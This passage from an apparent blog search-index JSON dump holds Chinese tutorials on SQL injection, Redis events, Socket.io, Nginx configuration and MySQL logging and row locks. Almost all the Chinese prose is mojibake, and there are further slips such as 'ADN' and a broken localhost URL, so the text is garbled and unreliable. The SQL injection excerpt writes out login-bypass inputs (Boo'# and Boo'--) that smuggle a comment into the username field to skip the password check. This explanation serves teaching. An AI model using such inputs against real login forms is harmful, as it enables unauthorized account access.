1å´æ˜¯ä¸€ä¸ªæ°¸è¿œå­˜åœ¨çš„æ¡ä»¶ï¼Œè¿™å°±ç›¸å½“äºæ²¡æœ‰åŠ  Where æ¡ä»¶ã€‚ 2. å­—ç¬¦ä¸²æ³¨å…¥ç°åœ¨æœ‰è¿™æ ·ä¸€ç§åœºæ™¯ï¼šhttp://127.0.0./login.phpæ¨¡æ‹Ÿç”¨æˆ·ç™»å½•ã€‚å‡è®¾æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯Booã€122410ï¼Œé‚£ä¹ˆåœ¨æ­£å¸¸çš„ç™»å½•æƒ…å†µä¸‹æ‰€æ‰§è¡Œçš„SQL è¯­å¥å¦‚ä¸‹ï¼š 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; ADN password &#x3D; &#39;122410&#39; ç”±äºç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥SQL æ³¨å…¥ä¼šæŠŠå‚æ•°æºå¸¦çš„æ•°æ®å˜æˆMysqlä¸­çš„æ³¨é‡Šã€‚Mysql ä¸­çš„æ³¨é‡Šæœ‰ä¸¤ç§ã€‚ 1. #å‡è®¾POST ä¼ é€’çš„å‚æ•°åˆ†åˆ«æ˜¯ï¼šusername = Boo&#39;#ã€password = xxxxxxï¼Œé‚£ä¹ˆäº§ç”Ÿçš„SQL è¯­å¥åˆ™æ˜¯ï¼š 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;#&#39;ADN password &#x3D; &#39;xxxxxx&#39; å› ä¸º#å· åçš„æ‰€æœ‰å­—ç¬¦ä¸²éƒ½ä¼šè¢«å½“æˆæ³¨é‡Šæ¥å¤„ç†ï¼Œæ‰€ä»¥ä¸Šé¢çš„SQL è¯­å¥ç­‰ä»·äºï¼š 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; 2. --å‡è®¾POSTè¯·æ±‚ä¼ é€’çš„å‚æ•°åˆ†åˆ«æ˜¯ï¼šusername = Boo&#39;--ã€password = xxxxxxï¼Œé‚£ä¹ˆäº§ç”Ÿçš„SQL è¯­å¥åˆ™æ˜¯ï¼š 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;-- &#39;AND password &#x3D; &#39;xxxxxx&#39; å› ä¸º--å· åé¢çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šè¢«å½“æˆæ³¨é‡Šå¤„ç†ï¼Œæ‰€ä»¥ä¸Šé¢çš„SQL è¯­å¥ç­‰ä»·äºï¼š 1SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; æ— è®ºæ˜¯ä¸Šé¢çš„å“ªä¸€ç§æƒ…å†µï¼Œæ”»å‡»è€…éƒ½èƒ½åœ¨ä¸çŸ¥é“å…·ä½“å¯†ç çš„æƒ…å†µä¸‹è€ŒæˆåŠŸç™»å½•ã€‚ è¿™å¤§æ¦‚å°±æ˜¯ä¸€ä¸ªç®€å•çš„SQLæ³¨å…¥äº§ç”Ÿçš„å®Œæ•´è¿‡ç¨‹äº†ï¼Œè¿™é‡Œåªæ˜¯æŠ›ç –å¼•ç‰çš„ä»‹ç»äº†ä¸‹åŸç†ï¼Œè€Œå®é™…åœºæ™¯ä¸­çš„SQL æ³¨å…¥å½“ç„¶è¿œè¿œä¸æ­¢è¿™ä¸¤ç§ã€‚ å‚è€ƒé“¾æ¥SQL æ³¨å…¥å¸¸è§æ–¹å¼ä»¥åŠæ£€æµ‹æ–¹æ³•","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Web å®‰å…¨","slug":"Web-å®‰å…¨","permalink":"https://www.0x2beace.com/tags/Web-%E5%AE%89%E5%85%A8/"}]},{"title":"Redis å¸¸è§äº‹ä»¶æ•´ç†","slug":"redis-common-events-collation","date":"2020-07-21T15:41:45.000Z","updated":"2020-07-21T15:42:45.608Z","comments":true,"path":"redis-common-events-collation/","link":"","permalink":"https://www.0x2beace.com/redis-common-events-collation/","excerpt":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç† Redis çš„å¸¸ç”¨äº‹ä»¶ã€‚","text":"è¿™ç¯‡ç¬”è®°ç”¨æ¥æ•´ç† Redis çš„å¸¸ç”¨äº‹ä»¶ã€‚ å®¢æˆ·ç«¯äº‹ä»¶å®¢æˆ·ç«¯ä¼šå‘å‡ºä¸€äº›äº‹ä»¶çš„çŠ¶æ€è¿æ¥åˆ°Redis æœåŠ¡å™¨ã€‚ ReadyErrorå®¢æˆ·ç«¯è¿æ¥Redis æ—¶ï¼Œå¦‚æœå‡ºç°å¼‚å¸¸ï¼Œåˆ™ä¼šè§¦å‘Error äº‹ä»¶ã€‚ Connectå®¢æˆ·ç«¯è¿æ¥è‡³Redis æ—¶ï¼Œä¼šè§¦å‘è¿æ¥äº‹ä»¶ã€‚ è®¢é˜…è€…äº‹ä»¶Messageå°†æ¥æ”¶åˆ°æ¥è‡ªè®¢é˜…é¢‘é“çš„æ¶ˆæ¯ï¼Œ 123client.on(&quot;message&quot;, function (channel, message) &#123; ...&#125;) Subscribeç›‘å¬è®¢é˜…äº‹ä»¶ï¼Œè¿”å›è®¢é˜…é¢‘é“çš„è®¢é˜…æ•°é‡ã€‚ 123client.on(&quot;subscribe&quot;, function (channel, count) &#123; ...&#125;) å‘å¸ƒ/è®¢é˜…Publishå°†ä¿¡æ¯ message å‘é€åˆ°æŒ‡å®šçš„é¢‘é“ channel ã€‚ è¿”å›å€¼ï¼šæ¥æ”¶åˆ°ä¿¡æ¯ message çš„è®¢é˜…è€…æ•°é‡ã€‚ 1PUBLISH channel message SUBSCRIBEè®¢é˜…ç»™å®šé¢‘é“çš„ä¿¡æ¯ã€‚ è¿”å›å€¼ï¼šæ¥æ”¶åˆ°çš„ä¿¡æ¯ã€‚ 1SUBSCRIBE channel [channel ...] å‚è€ƒé“¾æ¥ Rediså‘½ä»¤å‚è€ƒç®€ä½“ä¸­æ–‡ç‰ˆ A high performance Node.js Redis client","categories":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"https://www.0x2beace.com/tags/Redis/"}]},{"title":"Socket.io å¿«é€Ÿä¸Šæ‰‹","slug":"socket-io-quick-start","date":"2020-07-20T05:02:05.000Z","updated":"2020-07-20T05:04:22.840Z","comments":true,"path":"socket-io-quick-start/","link":"","permalink":"https://www.0x2beace.com/socket-io-quick-start/","excerpt":"æœ€è¿‘ä½¿ç”¨socket.io å’Œ redis å®Œæˆäº†ä¸€äº›å°åŠŸèƒ½ï¼Œè§‰å¾—å¾ˆå®ç”¨ï¼Œæ‰€ä»¥æ•´ç†ä¸€ä¸‹socket.ioç›¸å…³çš„çŸ¥è¯†ã€‚","text":"æœ€è¿‘ä½¿ç”¨socket.io å’Œ redis å®Œæˆäº†ä¸€äº›å°åŠŸèƒ½ï¼Œè§‰å¾—å¾ˆå®ç”¨ï¼Œæ‰€ä»¥æ•´ç†ä¸€ä¸‹socket.ioç›¸å…³çš„çŸ¥è¯†ã€‚ socket.io æ˜¯ä»€ä¹ˆå®ƒæ˜¯ä¸€ä¸ªæœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯ä¹‹é—´å»ºç«‹é€šè®¯çš„å·¥å…·ã€‚ æœåŠ¡ç«¯åˆ›å»ºå¥½æœåŠ¡ä¹‹åï¼Œå®¢æˆ·ç«¯é€šè¿‡ä¸»æœºä¸ä¹‹å»ºç«‹è¿æ¥ã€‚ç„¶åå°±å¯ä»¥è¿›è¡Œé€šè®¯äº†ã€‚ æƒ³è¦ä½¿ç”¨å¥½socket.ioï¼Œä¸€å®šè¦ç†è§£é€šè®¯çš„æ¦‚å¿µã€‚é€šè®¯ä¸€å®šæ˜¯åŒå‘çš„ï¼Œå¦‚æœå®¢æˆ·ç«¯èƒ½å¤Ÿæ”¶åˆ°æ¶ˆæ¯ï¼Œé‚£ä¹ˆåœ¨æŸä¸ªåœ°æ–¹å°±ä¸€å®šå­˜åœ¨æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯æ¨é€æ¶ˆæ¯ã€‚ å¿«é€Ÿä¸Šæ‰‹è¦å¼€å§‹ä½¿ç”¨socket.ioè¿›è¡Œå¼€å‘ï¼Œéœ€è¦å…ˆå®‰è£…Nodeå’Œnpmã€‚ åˆ›å»ºä¸€ä¸ªåä¸ºapp.jsçš„æ–‡ä»¶ï¼Œå¹¶æ·»åŠ ä»¥ä¸‹ä»£ç ã€‚ 12345678910111213141516var app &#x3D; require(&#39;express&#39;)();var http &#x3D; require(&#39;http&#39;).Server(app);&#x2F;&#x2F; åˆ›å»ºä¸€ä¸ªé™„åŠ åˆ°httpæœåŠ¡å™¨çš„æ–°socket.ioå®ä¾‹var io &#x3D; require(&#39;socket.io&#39;)(http);app.get(&#39;&#x2F;&#39;, function(req, res)&#123; res.sendFile(__dirname + &#39;&#x2F;index.html&#39;);&#125;);io.on(&#39;connection&#39;, function(socket)&#123; console.log(&#39;a user connected&#39;);&#125;);http.listen(3000, function()&#123; console.log(&#39;listening on *:3000&#39;);&#125;); è¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ªæœ€ç®€å•çš„socketæœåŠ¡ç«¯ã€‚ åˆ›å»ºindex.html æ–‡ä»¶æ¥ä½œä¸ºå®¢æˆ·ç«¯æä¾›æœåŠ¡ã€‚ 1234567&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; å¯åŠ¨æœåŠ¡ 1node app.js åˆ›å»ºçš„æœåŠ¡è¿è¡Œåœ¨æœ¬åœ°çš„ 3000 ç«¯å£ä¸Šï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œè¾“å…¥http://localhost:3000è¿›è¡Œè®¿é—®ã€‚ ä½¿ç”¨äº‹ä»¶socket.io çš„æ ¸å¿ƒç†å¿µå°±æ˜¯å…è®¸å‘é€ã€æ¥æ”¶ä»»æ„äº‹ä»¶å’Œä»»æ„æ•°æ®ã€‚ä»»æ„èƒ½è¢«ç¼–ç ä¸º JSON çš„å¯¹è±¡éƒ½å¯ä»¥ç”¨äºä¼ è¾“ã€‚äºŒè¿›åˆ¶æ•°æ® ä¹Ÿæ˜¯æ”¯æŒçš„ã€‚ åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬å·²ç»åˆ›å»ºäº†ä¸€ä¸ªæœåŠ¡ç«¯çš„socket.ioå¯¹è±¡ï¼Œå¦‚æœæƒ³è¦èƒ½æ­£å¸¸é€šè®¯ï¼Œè¿˜éœ€è¦åœ¨å®¢æˆ·ç«¯åŒæ ·ä¹Ÿåˆ›å»ºä¸€ä¸ªsocket.ioå¯¹è±¡ã€‚è¿™ä¸ªè„šæœ¬ç”±æœåŠ¡ç«¯çš„/socket.io/socket.io.js æä¾›ã€‚ 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; var socket &#x3D; io(); &lt;&#x2F;script&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; åœ¨å®¢æˆ·ç«¯ä¸­å»ºç«‹ socket.io è¿æ¥ã€‚ åœ¨æœåŠ¡ç«¯ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼š 12345678910111213 ...&#x2F;&#x2F; åªæœ‰æœ‰å®¢æˆ·ç«¯è¿æ¥ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶io.on(&#39;connection&#39;, function(socket) &#123; console.log(&#39;A user connected&#39;); &#x2F;&#x2F; åªæœ‰æœ‰å®¢æˆ·ç«¯æ–­å¼€è¿æ¥ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªäº‹ä»¶ socket.on(&#39;disconnect&#39;, function () &#123; console.log(&#39;A user disconnected&#39;); &#125;);&#125;); ... ç°åœ¨å†æ¬¡è®¿é—®http://localhost:3000ï¼Œä¸ä»…å¯ä»¥åœ¨æµè§ˆå™¨ä¸­çœ‹è§hello worldï¼Œå¦‚æœåˆ·æ–°æµè§ˆå™¨ï¼Œè¿˜èƒ½åœ¨æ§åˆ¶å°ä¸­çœ‹è§ä»¥ä¸‹å†…å®¹ï¼š 123A user connectedA user disconnectedA user connected åœ¨ä¸Šé¢çš„æ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†socket.ioçš„connectionå’Œdisconnectäº‹ä»¶ï¼Œsocket.ioè¿˜æœ‰å¾ˆå¤šå…¶ä¸­äº‹ä»¶ã€‚ äº‹ä»¶å¤„ç†åœ¨æœåŠ¡ç«¯ä¸­æœ‰ä»¥ä¸‹æ˜¯ä¿ç•™å­—ï¼š Connect Message Disconnect Reconnect Ping Join and Leave åœ¨å®¢æˆ·ç«¯ä¸­ä»¥ä¸‹æ˜¯ä¿ç•™å­—ï¼š Connect Connect_error Connect_timeout Reconnect, etc å¸¸ç”¨APIå®¢æˆ·ç«¯ æä¾›çš„ä¸€äº›ç”¨äºå¤„ç†é”™è¯¯/å¼‚å¸¸çš„APIã€‚ 1234567891011121314151617Connect âˆ’ When the client successfully connects.Connecting âˆ’ When the client is in the process of connecting.Disconnect âˆ’ When the client is disconnected.Connect_failed âˆ’ When the connection to the server fails.Error âˆ’ An error event is sent from the server.Message âˆ’ When the server sends a message using the send function.Reconnect âˆ’ When reconnection to the server is successful.Reconnecting âˆ’ When the client is in the process of connecting.Reconnect_failed âˆ’ When the reconnection attempt fails. å¹¿æ’­å¹¿æ’­æ„å‘³ç€å‘æ‰€æœ‰è¿æ¥çš„å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯ã€‚ è¦å‘æ‰€æœ‰å®¢æˆ·ç«¯å¹¿æ’­äº‹ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨io.sockets.emitæ–¹æ³•ã€‚ 12345678910111213 ...var clients &#x3D; 0;io.on(&#39;connection&#39;, function(socket) &#123; clients++; io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;); socket.on(&#39;disconnect&#39;, function () &#123; clients--; io.sockets.emit(&#39;broadcast&#39;,&#123; description: clients + &#39; clients connected!&#39;&#125;); &#125;);&#125;); ... å¹¿æ’­åœ¨socket.ioä¸­åº”ç”¨çš„éå¸¸å¤šï¼Œæœ‰å¹¿æ’­å°±æ„å‘³ç€æœ‰æ¥æ”¶ã€‚éœ€è¦åœ¨å®¢æˆ·ç«¯ä¸­å¤„ç†å¹¿æ’­äº‹ä»¶ï¼š 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Hello world&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;script src &#x3D; &quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt; &lt;script&gt; var socket &#x3D; io(); socket.on(&#39;broadcast&#39;,function(data) &#123; document.body.innerHTML &#x3D; &#39;&#39;; document.write(data.description); &#125;); &lt;&#x2F;script&gt; &lt;body&gt;Hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; å¯ä»¥å°è¯•æ‰“å¼€å¤šä¸ªæµè§ˆå™¨ï¼Œè¾“å…¥http://localhost:3000ï¼Œå¯èƒ½ä¼šå¾—åˆ°ä»¥ä¸‹ç»“æœï¼š å‚è€ƒé“¾æ¥ Socket.io Tutorial","categories":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"},{"name":"Socket.io","slug":"Node/Socket-io","permalink":"https://www.0x2beace.com/categories/Node/Socket-io/"}],"tags":[{"name":"Socket.io","slug":"Socket-io","permalink":"https://www.0x2beace.com/tags/Socket-io/"}]},{"title":"Nginx å¸¸è§é…ç½®","slug":"nginx-common-configuration","date":"2020-07-19T10:22:26.000Z","updated":"2020-07-19T10:24:25.144Z","comments":true,"path":"nginx-common-configuration/","link":"","permalink":"https://www.0x2beace.com/nginx-common-configuration/","excerpt":"æœ€è¿‘æ¥è§¦Nginx é…ç½®æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥æ•´ç†ä¸€ä¸‹ï¼Œæ–¹ä¾¿åé¢å›é¡¾ã€‚","text":"æœ€è¿‘æ¥è§¦Nginx é…ç½®æ¯”è¾ƒå¤šï¼Œæ‰€ä»¥æ•´ç†ä¸€ä¸‹ï¼Œæ–¹ä¾¿åé¢å›é¡¾ã€‚ å¤šç«™ç‚¹é…ç½®å¦‚æœä¸€å°æœåŠ¡å™¨ï¼Œéœ€è¦é…ç½®å¤šå¥—ç«™ç‚¹ï¼Œæ¨èä½¿ç”¨ IP + ç«¯å£é…ç½®ç«™ç‚¹ï¼Œç„¶åä½¿ç”¨åå‘ä»£ç†æŒ‡å‘ç«¯å£ã€‚ ç«™ç‚¹é…ç½® 12345678910server &#123; listen 40001; location ~ \\.php &#123; ... &#125; location &#x2F; &#123; ... &#125;&#125; å¤šç«™ç‚¹é…ç½® 123456789101112131415161718192021&#x2F;&#x2F; ç«™ç‚¹1 server &#123; server_name yoursite.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125;&#x2F;&#x2F; ç«™ç‚¹2server &#123; server_name yoursite2.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; åå‘ä»£ç†åå‘ä»£ç†å…¶å®å·²ç»åœ¨ä¸Šé¢çš„é…ç½®ä¸­å‡ºç°è¿‡äº†ï¼Œå¤šç«™ç‚¹é…ç½®çš„åŸç†å°±æ˜¯åˆ©ç”¨åå‘ä»£ç†ã€‚ 123456789server &#123; server_name yoursite2.com; listen 80; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; SSL é…ç½®ç”³è¯·å¥½è¯ä¹¦ä¹‹åï¼Œå°†å…¶æ”¾åœ¨æœåŠ¡å™¨ä¸Šï¼Œç„¶åç¼–è¾‘Nginx é…ç½®ï¼š 12345678910111213server &#123; server_name yoursite.com; listen 443 ssl; ssl on; ssl_certificate ssl_0123cp_net&#x2F;full_chain.pem; &#x2F;&#x2F; è¯ä¹¦æ‰€åœ¨è·¯å¾„ ssl_certificate_key ssl_0123cp_net&#x2F;private.key; &#x2F;&#x2F; è¯ä¹¦å¯¹åº”çš„ç§é’¥æ‰€åœ¨è·¯å¾„ location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;127.0.0.1:40001; index index.html index.htm index.jsp index.js; &#125;&#125; httpé‡å®šå‘é…ç½®å¥½ httpsä¹‹åï¼Œè¿˜éœ€è¦åšä¸€ä»¶äº‹ï¼Œæ‰èƒ½ä¿è¯ httpsèƒ½å¤Ÿæ­£å¸¸è®¿é—®ã€‚ å› ä¸ºè®¿é—®ä»»ä½•ä¸€ä¸ªç½‘ç«™æ—¶ï¼Œé»˜è®¤ä½¿ç”¨çš„æ˜¯httpåè®®ï¼Œæ‰€ä»¥éœ€è¦åœ¨Web Serverä¸­é…ç½®http è‡ªåŠ¨è·³è½¬ httpsã€‚ 123456server &#123; server_name yoursite.com; listen 80; rewrite ^(.*) https:&#x2F;&#x2F;$server_name$1 permanent;&#125;","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"}]},{"title":"Mac å¼€å¯ Mysql æ—¥å¿—è®°å½•","slug":"mac-open-mysql-logging","date":"2020-07-19T09:24:43.000Z","updated":"2020-07-20T05:06:44.373Z","comments":true,"path":"mac-open-mysql-logging/","link":"","permalink":"https://www.0x2beace.com/mac-open-mysql-logging/","excerpt":"æœ‰æ—¶å€™å¯èƒ½ä¼šæƒ³åœ¨æœ¬åœ°å¼€å¯Mysql çš„æ—¥å¿—è®°å½•ï¼Œçœ‹çœ‹å…·ä½“éƒ½æ‰§è¡Œäº†å“ªäº›SQLï¼Œå…¶å®éå¸¸ç®€å•ã€‚","text":"æœ‰æ—¶å€™å¯èƒ½ä¼šæƒ³åœ¨æœ¬åœ°å¼€å¯Mysql çš„æ—¥å¿—è®°å½•ï¼Œçœ‹çœ‹å…·ä½“éƒ½æ‰§è¡Œäº†å“ªäº›SQLï¼Œå…¶å®éå¸¸ç®€å•ã€‚ è¿›å…¥Mysql å‘½ä»¤è¡Œ 1mysql -hlocalhost -uroot -p å…¨å±€å¼€å¯æ™®é€šæ—¥å¿—è®°å½• 1set global general_log&#x3D;on; æŸ¥çœ‹Mysql æ—¥å¿—æ–‡ä»¶æ‰€åœ¨ç›®å½• 1show variables like &#39;general_log_file&#39;; å®æ—¶æŸ¥çœ‹æ—¥å¿—è®°å½• 1tail -f &#x2F;your_mysql_log_file_path","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Mysql è¡Œé”åŸå› åˆ†æ","slug":"analysis-of-the-causes-of-mysql-row-lock","date":"2020-07-19T09:03:04.000Z","updated":"2020-07-19T09:11:47.872Z","comments":true,"path":"analysis-of-the-causes-of-mysql-row-lock/","link":"","permalink":"https://www.0x2beace.com/analysis-of-the-causes-of-mysql-row-lock/","excerpt":"è¿™ç¯‡æ–‡ç« æ¥æµ…è°ˆä¸€ä¸‹ä»€ä¹ˆæ˜¯Mysql è¡Œé”ï¼Œä»¥åŠäº§ç”Ÿè¡Œé”çš„åŸå› ã€‚","text":"è¿™ç¯‡æ–‡ç« æ¥æµ…è°ˆä¸€ä¸‹ä»€ä¹ˆæ˜¯Mysql è¡Œé”ï¼Œä»¥åŠäº§ç”Ÿè¡Œé”çš„åŸå› ã€‚ é”çš„åˆ†ç±»MySQLæœ‰ä¸‰ç§é”çš„çº§åˆ«ï¼šé¡µçº§ã€è¡¨çº§ã€è¡Œçº§ã€‚ è¡¨çº§é”ï¼šå¼€é”€å°ï¼ŒåŠ é”å¿«ï¼›ä¸ä¼šå‡ºç°æ­»é”ï¼›é”å®šç²’åº¦å¤§ï¼Œå‘ç”Ÿé”å†²çªçš„æ¦‚ç‡æœ€é«˜,å¹¶å‘åº¦æœ€ä½ã€‚ è¡Œçº§é”ï¼šå¼€é”€å¤§ï¼ŒåŠ é”æ…¢ï¼›ä¼šå‡ºç°æ­»é”ï¼›é”å®šç²’åº¦æœ€å°ï¼Œå‘ç”Ÿé”å†²çªçš„æ¦‚ç‡æœ€ä½,å¹¶å‘åº¦ä¹Ÿæœ€é«˜ã€‚ é¡µé¢é”ï¼šå¼€é”€å’ŒåŠ é”æ—¶é—´ç•Œäºè¡¨é”å’Œè¡Œé”ä¹‹é—´ï¼›ä¼šå‡ºç°æ­»é”ï¼›é”å®šç²’åº¦ç•Œäºè¡¨é”å’Œè¡Œé”ä¹‹é—´ï¼Œå¹¶å‘åº¦ä¸€èˆ¬ å› ä¸ºè¿™ç¯‡ç¬”è®°åªä»‹ç»Mysql è¡Œé”ï¼Œæ‰€ä»¥è¿™é‡Œä¸å¯¹å…¶ä»–ç±»å‹çš„é”åšä»‹ç»äº†ã€‚ è¡Œé”InnoDBå®ç°äº†ä¸¤ç§ç±»å‹çš„è¡Œé”: å…±äº«é”ã€Sé”ã€‘åˆç§°è¯»é”ï¼Œè‹¥äº‹åŠ¡Tå¯¹æ•°æ®å¯¹è±¡AåŠ ä¸ŠSé”ï¼Œåˆ™äº‹åŠ¡Tå¯ä»¥è¯»Aä½†ä¸èƒ½ä¿®æ”¹Aï¼Œå…¶ä»–äº‹åŠ¡åªèƒ½å†å¯¹AåŠ Sé”ï¼Œè€Œä¸èƒ½åŠ Xé”ï¼Œç›´åˆ°Té‡Šæ”¾Aä¸Šçš„Sé”ã€‚è¿™ä¿è¯äº†å…¶ä»–äº‹åŠ¡å¯ä»¥è¯»Aï¼Œä½†åœ¨Té‡Šæ”¾Aä¸Šçš„Sé”ä¹‹å‰ä¸èƒ½å¯¹Aåšä»»ä½•ä¿®æ”¹ã€‚ æ’ä»–é”ã€Xé”ã€‘åˆç§°å†™é”ã€‚è‹¥äº‹åŠ¡Tå¯¹æ•°æ®å¯¹è±¡AåŠ ä¸ŠXé”ï¼Œäº‹åŠ¡Tå¯ä»¥è¯»Aä¹Ÿå¯ä»¥ä¿®æ”¹Aï¼Œå…¶ä»–äº‹åŠ¡ä¸èƒ½å†å¯¹AåŠ ä»»ä½•é”ï¼Œç›´åˆ°Té‡Šæ”¾Aä¸Šçš„é”ã€‚è¿™ä¿è¯äº†å…¶ä»–äº‹åŠ¡åœ¨Té‡Šæ”¾Aä¸Šçš„é”ä¹‹å‰ä¸èƒ½å†è¯»å–å’Œä¿®æ”¹Aã€‚ æ‰€è°“Xé”,æ˜¯äº‹åŠ¡Tå¯¹æ•°æ®AåŠ ä¸ŠXé”æ—¶,åªå…è®¸äº‹åŠ¡Tè¯»å–å’Œä¿®æ”¹æ•°æ®A; æ‰€è°“Sé”,æ˜¯äº‹åŠ¡Tå¯¹æ•°æ®AåŠ ä¸ŠSé”æ—¶,å…¶ä»–äº‹åŠ¡åªèƒ½å†å¯¹æ•°æ®AåŠ Sé”,è€Œä¸èƒ½åŠ Xé”,ç›´åˆ°Té‡Šæ”¾Aä¸Šçš„Sé” åœºæ™¯é‡ç° é¦–å…ˆåˆ›å»ºä¸€ä¸ª InnoDBç±»å‹çš„æ•°æ®è¡¨ï¼ŒSQL å¦‚ä¸‹ï¼š 1234CREATE TABLE &#96;gap&#96; ( &#96;id&#96; int(11) DEFAULT NULL, KEY &#96;ind_gap_id&#96; (&#96;id&#96;)) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8; åˆ›å»ºä¼šè¯1ï¼Œå¼€å¯äº‹åŠ¡Aå¹¶æ‰§è¡Œupdate è¯­å¥ 12start transaction;update gap set id &#x3D; 30 where id &#x3D; 33; åˆ›å»ºä¼šè¯2ï¼Œå¼€å¯äº‹åŠ¡Bå¹¶æ‰§è¡Œå¦ä¸€ä¸ªupdate è¯­å¥ 12start transaction;update gap set id &#x3D; 22 where id &#x3D; 20; åœ¨ä¼šè¯2ä¸­ æ’å…¥20 &gt; id &lt; 39èŒƒå›´å¤–çš„å€¼æ—¶ å¯ä»¥æ‰§è¡ŒæˆåŠŸ,è€Œå½“è¦æ’å…¥ [20,39)èŒƒå›´å†…çš„å€¼æ—¶ ä¼šé‡åˆ°gap lock ã€‚ ç”¨ä¼šè¯1 æŸ¥çœ‹å½“å‰æ­£åœ¨è¿›è¡Œä¸­çš„äº‹åŠ¡1SELECT * FROM information_schema.INNODB_TRX; ä¸ä¼šæ„å¤–ï¼Œèƒ½çœ‹åˆ°ä¸‹é¢ä¸¤æ¡è®°å½•ï¼š å¯ä»¥çœ‹åˆ° è¿›ç¨‹idä¸º3175 çš„äº‹åŠ¡åœ¨é”ä½äº†ï¼Œè€Œå¦ä¸€ä¸ªidä¸º3173çš„äº‹åŠ¡æ­£åœ¨æ‰§è¡Œï¼Œä½†æ˜¯æ²¡æœ‰æäº¤äº‹åŠ¡ã€‚ è¿™æ˜¯å› ä¸ºæ‰§è¡Œupdate è¯­å¥ä¹‹åï¼Œmysql ä¼šæ‰§è¡Œç´¢å¼•æ‰«æå¹¶åœ¨è¯¥è¡¨ä¸Šæ–½åŠ ä¸€ä¸ª next-key lock ,å‘å·¦æ‰«æåˆ°20,å‘å³æ‰«æåˆ°39 ,é”å®šåŒºé—´å·¦é—­å³å¼€,æ‰€ä»¥lockçš„èŒƒå›´æ˜¯ [20,39)ã€‚ è§£å†³åŠæ³•æ ¹æ®å®é™…æƒ…å†µçš„ä¸åŒï¼Œæœ‰ä¸åŒçš„æ–¹å¼å¯ä»¥é¿å…æ­»é”ï¼Œè¿™é‡Œä»‹ç»å¸¸ç”¨çš„å‡ ç§ï¼š æ”¹å˜æ•°æ®åº“æ“ä½œé€»è¾‘ï¼Œå°½é‡é¿å…åœ¨ä¸åŒçš„äº‹åŠ¡ä¸­ï¼Œå¯¹åŒä¸€æ¡è®°å½•è¿›è¡Œæ›´æ”¹ã€‚ å¦‚æœä¸åŒç¨‹åºä¼šå¹¶å‘å­˜å–å¤šä¸ªè¡¨ï¼Œå°½é‡çº¦å®šä»¥ç›¸åŒçš„é¡ºåºè®¿é—®è¡¨ï¼Œå¯ä»¥å¤§å¤§é™ä½æ­»é”æœºä¼šã€‚ å‚è€ƒé“¾æ¥ Mysql æ­»é”åŸå› åˆ†æ","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql 